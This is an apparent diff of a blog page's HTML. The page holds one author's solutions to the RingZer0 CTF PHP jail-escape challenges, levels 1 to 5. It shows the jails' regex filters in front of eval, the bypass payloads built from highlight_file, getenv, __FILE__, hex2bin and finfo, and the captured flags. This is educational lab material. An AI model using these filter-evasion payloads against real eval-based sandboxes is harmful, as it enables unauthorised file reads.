@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -122,7 +122,7 @@
                 <div id="niu2-main-content">
                     <p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping</strong> PHP challenges.</p>
 <h1 id="5afaf1679ad0887adebaddb40e0bd3f7">Level 1</h1>
-<div class="highlight"><pre><span class="x">RingZer0 Team Online CTF</span>
+<div class="highlight"><pre><span></span><span class="x">RingZer0 Team Online CTF</span>
 
 <span class="x">PHP Jail Level 1:</span>
 <span class="x">Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)</span>
@@ -157,12 +157,12 @@
 <span class="x">Your input:</span>
 </pre></div>
 <p>Pretty simple:</p>
-<div class="highlight"><pre>Your input:
-<span class="nb">echo</span><span class="o">(</span>file_get_contents<span class="o">(</span><span class="s1">'flag.txt'</span><span class="o">))</span><span class="p">;</span>
+<div class="highlight"><pre><span></span>Your input:
+echo<span class="o">(</span>file_get_contents<span class="o">(</span><span class="s1">'flag.txt'</span><span class="o">))</span><span class="p">;</span>
 FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
 </pre></div>
 <h1 id="228e9da47384bacde793a2b78d488bb0">Level 2</h1>
-<div class="highlight"><pre><span class="x">PHP Jail Level 2</span>
+<div class="highlight"><pre><span></span><span class="x">PHP Jail Level 2</span>
 <span class="x">Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)</span>
 
 <span class="x">Flag is located at /home/level2/flag.txt</span>
@@ -196,14 +196,14 @@ FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
 </pre></div>
 <p>Since some functions (like <code>fread</code>, <code>file_get_contents</code> are not allowed) we can use <code>popen</code> to start an external command in order to 
 read the flag.txt:</p>
-<div class="highlight"><pre>popen<span class="o">(</span><span class="s2">"vim"</span>, <span class="s2">"w"</span><span class="o">)</span><span class="p">;</span>
+<div class="highlight"><pre><span></span>popen<span class="o">(</span><span class="s2">"vim"</span>, <span class="s2">"w"</span><span class="o">)</span><span class="p">;</span>
 </pre></div>
 <p>This <code>vim</code> is started and we can read the <code>flag.txt</code> by loading it into the buffer:</p>
-<div class="highlight"><pre>:r flag.txt
+<div class="highlight"><pre><span></span>:r flag.txt
 </pre></div>
 <p>Flag: FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL</p>
 <h1 id="8f60a63315c55e659b1a2dd5064ceae8">Level 3</h1>
-<div class="highlight"><pre>RingZer0 Team Online CTF
+<div class="highlight"><pre><span></span>RingZer0 Team Online CTF
 
 PHP Jail Level 3:
 Current user is <span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>level3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>level3<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>level3<span class="o">)</span>
@@ -224,12 +224,12 @@ array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="
 
 <span class="k">function</span> filter<span class="o">(</span><span class="nv">$var</span><span class="o">)</span> <span class="o">{</span>
         <span class="k">if</span><span class="o">(</span>preg_match<span class="o">(</span><span class="s1">'/(`|\.|\$|\/|a|c|s|require|include)/i'</span>, <span class="nv">$var</span><span class="o">))</span> <span class="o">{</span>
-                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+                <span class="k">return</span> false<span class="p">;</span>
         <span class="o">}</span>
-        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="k">return</span> true<span class="p">;</span>
 <span class="o">}</span>
 <span class="k">if</span><span class="o">(</span>filter<span class="o">(</span><span class="nv">$var</span><span class="o">))</span> <span class="o">{</span>
-        <span class="nb">eval</span><span class="o">(</span><span class="nv">$var</span><span class="o">)</span><span class="p">;</span>
+        eval<span class="o">(</span><span class="nv">$var</span><span class="o">)</span><span class="p">;</span>
         <span class="nb">echo</span> <span class="s2">"Command executed"</span><span class="p">;</span>
 <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
         <span class="nb">echo</span> <span class="s2">"Restricted characters has been used"</span><span class="p">;</span>
@@ -240,14 +240,14 @@ array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="
 -----------------------------
 </pre></div>
 <p>Since a lot of functions have been disabled, one must find a function that is <strong>allowed</strong> and doesn't contain any restricted characters. <a href="http://php.net/manual/en/function.highlight-file.php">highlight_file</a> is one of those functions:</p>
-<div class="highlight"><pre><span class="x">Your input:</span>
+<div class="highlight"><pre><span></span><span class="x">Your input:</span>
 <span class="x">highlight_file(glob("fl*txt")[0]);</span>
 <span class="x">&lt;code&gt;&lt;span style="color: #000000"&gt;</span>
 <span class="x">FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H&lt;br /&gt;&lt;/span&gt;</span>
 <span class="x">&lt;/code&gt;Command executed</span>
 </pre></div>
 <h1 id="309531bbe9a9d3228cd0687ec6e66bed">Level 4</h1>
-<div class="highlight"><pre>RingZer0 Team Online CTF
+<div class="highlight"><pre><span></span>RingZer0 Team Online CTF
 
 PHP Jail Level 4:
 Current user is <span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>level4<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>level4<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>level4<span class="o">)</span>
@@ -268,12 +268,12 @@ array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="
 
 <span class="k">function</span> filter<span class="o">(</span><span class="nv">$var</span><span class="o">)</span> <span class="o">{</span>
         <span class="k">if</span><span class="o">(</span>preg_match<span class="o">(</span><span class="s1">'/(\'</span><span class="p">|</span><span class="se">\"</span><span class="p">|</span><span class="sb">`</span><span class="p">|</span><span class="se">\.</span><span class="p">|</span><span class="se">\$</span><span class="p">|</span><span class="se">\/</span><span class="p">|</span>a<span class="p">|</span>c<span class="p">|</span>s<span class="p">|</span>require<span class="p">|</span>include<span class="o">)</span>/i<span class="err">'</span>, <span class="nv">$var</span><span class="o">))</span> <span class="o">{</span>
-                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+                <span class="k">return</span> false<span class="p">;</span>
         <span class="o">}</span>
-        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="k">return</span> true<span class="p">;</span>
 <span class="o">}</span>
 <span class="k">if</span><span class="o">(</span>filter<span class="o">(</span><span class="nv">$var</span><span class="o">))</span> <span class="o">{</span>
-        <span class="nb">eval</span><span class="o">(</span><span class="nv">$var</span><span class="o">)</span><span class="p">;</span>
+        eval<span class="o">(</span><span class="nv">$var</span><span class="o">)</span><span class="p">;</span>
         <span class="nb">echo</span> <span class="s2">"Command executed"</span><span class="p">;</span>
 <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
         <span class="nb">echo</span> <span class="s2">"Restricted characters has been used"</span><span class="p">;</span>
@@ -285,10 +285,10 @@ array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="
 Your input:
 </pre></div>
 <p>As you can notice <code>highlight_source</code> is <em>not</em> disabled, so you can use sth like:</p>
-<div class="highlight"><pre><span class="x">highlight_source("flag.txt");</span>
+<div class="highlight"><pre><span></span><span class="x">highlight_source("flag.txt");</span>
 </pre></div>
 <p>However, double quotes and the characters "a" and "." are not allowed. Next idea was to use <code>glob</code>:</p>
-<div class="highlight"><pre><span class="x">highlight_source(glob("*")[4]);</span>
+<div class="highlight"><pre><span></span><span class="x">highlight_source(glob("*")[4]);</span>
 </pre></div>
 <p>But again: Double quotes and the "*" character are not allowed. Since my solution is kind of complicated, I'll try to explain what 
 my thoughts were:</p>
@@ -298,20 +298,20 @@ c) I needed a way to define a string without using double quotes
 d) I wanted to somehow build the string "/home/level4/flag.txt" with allowed characters and use it with <code>glob</code></p>
 <p>Now the solutions to every particular problem:</p>
 <p>a) Using <code>phpinfo();</code> I've found out that there were some <em>environment</em> variables I could use to extract the "/". Then I ran:</p>
-<div class="highlight"><pre><span class="x">print_r(getenv(HOME));</span>
+<div class="highlight"><pre><span></span><span class="x">print_r(getenv(HOME));</span>
 <span class="x">PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">/home/level4Command executed</span>
 </pre></div>
 <p>Then I could extract the "/" by using </p>
-<div class="highlight"><pre><span class="x">getenv(HOME)[0];</span>
+<div class="highlight"><pre><span></span><span class="x">getenv(HOME)[0];</span>
 </pre></div>
 <p>b) PHP has some <strong>predefined constants</strong> like <code>__FILE__</code>, <code>__DIR__</code> and so on:</p>
-<div class="highlight"><pre><span class="x">print_r(__FILE__);</span>
+<div class="highlight"><pre><span></span><span class="x">print_r(__FILE__);</span>
 <span class="x">/home/level4/jail.php(14) : eval()'d codeCommand executed</span>
 </pre></div>
 <p>Using <code>__FILE__</code> I can extract "a" and ".".</p>
 <p>c) Using <code>define()</code>, <code>implode()</code>/<code>explode()</code> one could define contants as strings and use array operations to extract/concat characters:</p>
-<div class="highlight"><pre><span class="x">define(HEY,__FILE__);print_r(explode(getenv(HOME)[0],HEY));</span>
+<div class="highlight"><pre><span></span><span class="x">define(HEY,__FILE__);print_r(explode(getenv(HOME)[0],HEY));</span>
 <span class="x">PHP Notice:  Use of undefined constant HEY - assumed 'HEY' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">Array</span>
@@ -323,7 +323,7 @@ d) I wanted to somehow build the string "/home/level4/flag.txt" with allowed cha
 <span class="x">)</span>
 </pre></div>
 <p>By using <code>implode()</code> you can then concatenate several characters:</p>
-<div class="highlight"><pre><span class="x">print_r(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,file]));</span>
+<div class="highlight"><pre><span></span><span class="x">print_r(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,file]));</span>
 <span class="x">PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">PHP Notice:  Use of undefined constant home - assumed 'home' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
@@ -332,7 +332,7 @@ d) I wanted to somehow build the string "/home/level4/flag.txt" with allowed cha
 <span class="x">//home/level4/fileCommand executed</span>
 </pre></div>
 <p>d) Now if you put a), b) and c) together you should be able to build your payload:</p>
-<div class="highlight"><pre><span class="x">define(HEY, __FILE__); highlight_file(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,getenv(HOME)[0],implode(explode(getenv(HOME)[0],HEY)[0], [fl,explode(getenv(HOME)[0],HEY)[3][1],g,explode(getenv(HOME)[0],HEY)[3][4],t,x,t])])); </span>
+<div class="highlight"><pre><span></span><span class="x">define(HEY, __FILE__); highlight_file(implode(getenv(HOME)[0],[getenv(HOME)[0],home,level4,getenv(HOME)[0],implode(explode(getenv(HOME)[0],HEY)[0], [fl,explode(getenv(HOME)[0],HEY)[3][1],g,explode(getenv(HOME)[0],HEY)[3][4],t,x,t])])); </span>
 <span class="x">PHP Notice:  Use of undefined constant HEY - assumed 'HEY' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
 <span class="x">PHP Notice:  Use of undefined constant HOME - assumed 'HOME' in /home/level4/jail.php(14) : eval()'d code on line 1</span>
@@ -353,7 +353,7 @@ d) I wanted to somehow build the string "/home/level4/flag.txt" with allowed cha
 </pre></div>
 <p>I know... Very complicated (I've seen solutions using <code>hex2bin()</code>) but it does its job :) </p>
 <h1 id="05988e43e8f2eb5efdddc2b467c4b2f3">Level 5</h1>
-<div class="highlight"><pre><span class="x">RingZer0 Team Online CTF</span>
+<div class="highlight"><pre><span></span><span class="x">RingZer0 Team Online CTF</span>
 
 <span class="x">PHP Jail Level 5:</span>
 <span class="x">Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)</span>
@@ -391,7 +391,7 @@ d) I wanted to somehow build the string "/home/level4/flag.txt" with allowed cha
 <span class="x">Your input:</span>
 </pre></div>
 <p>The first thing I did was to generate the filename (<code>flag.txt</code>):</p>
-<div class="highlight"><pre><span class="x">Your input:</span>
+<div class="highlight"><pre><span></span><span class="x">Your input:</span>
 <span class="x">print(glob(hex2bin(hex2bin(3261)))[0]);</span>
 <span class="x">flag.txtCommand executed</span>
 <span class="x">Your input:</span>
@@ -403,7 +403,7 @@ any one that would bypass the restrictions. Then I bought the hint which stated:
 </blockquote>
 <p>So I need some class with some <strong>constructor</strong> which takes a filename as an argument. As always: Google is your friend -&gt;
 <code>inurl:php.net/manual/en/class</code>. And then I've found <a href="http://php.net/manual/en/class.finfo.php">Finfo</a>:</p>
-<div class="highlight"><pre>Your input:
+<div class="highlight"><pre><span></span>Your input:
 new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
 PHP Notice:  finfo::finfo(): Warning: offset `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ' invalid in /home/level5/jail.php(14) : eval()'d code on line 1
 PHP Notice:  finfo::finfo(): Warning: type `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ' invalid in /home/level5/jail.php(14) : eval()'d code on line 1
@@ -449,9 +449,9 @@ Command executed
                     <div class="niu2-sidebar-label"><i class="icon-pencil"></i>category:</div>
                     <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ringzer0/">ringzer0</a><sup>5</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>8</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ringzer0/">ringzer0</a><sup>7</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/php/">php</a><sup>5</sup></div>
                 </div>
 
